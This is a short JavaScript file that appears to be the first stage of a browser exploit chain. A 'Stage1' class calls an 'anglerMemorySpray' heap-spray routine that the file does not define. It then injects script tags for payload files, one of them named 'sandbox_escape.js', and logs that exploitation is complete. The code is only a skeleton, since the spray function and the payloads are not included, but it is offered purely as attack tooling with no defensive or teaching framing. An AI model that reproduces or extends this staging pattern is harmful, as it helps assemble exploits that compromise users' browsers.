let r = {};

class Stage1 {
    constructor() {
        console.log("[STAGE1] Initializing...");
        this.sprayArray = null;
    }

    performMemorySpray() {
        console.log("[STAGE1] Executing memory spray...");
        this.sprayArray = anglerMemorySpray(5000, 1024);
    }

    loadPayloads() {
        console.log("[STAGE1] Loading payloads...");

        const payloadFiles = [
            "./payloads/payload1.js",
            "./payloads/payload2.js",
            "./payloads/sandbox_escape.js",
            "./payloads/hello_world.js"
        ];

        payloadFiles.forEach(payload => {
            const script = document.createElement('script');
            script.src = payload;
            script.async = false;
            document.body.appendChild(script);
            script.onload = () => console.log(`[PAYLOAD LOADED]: ${payload}`);
        });
    }

    runExploit() {
        this.performMemorySpray(); // Step 1: Memory spraying
        this.loadPayloads();       // Step 2: Load payloads
        console.log("[STAGE1] Exploitation completed.");
    }
}

r.si = () => {
    const stage1 = new Stage1();
    stage1.runExploit();
};
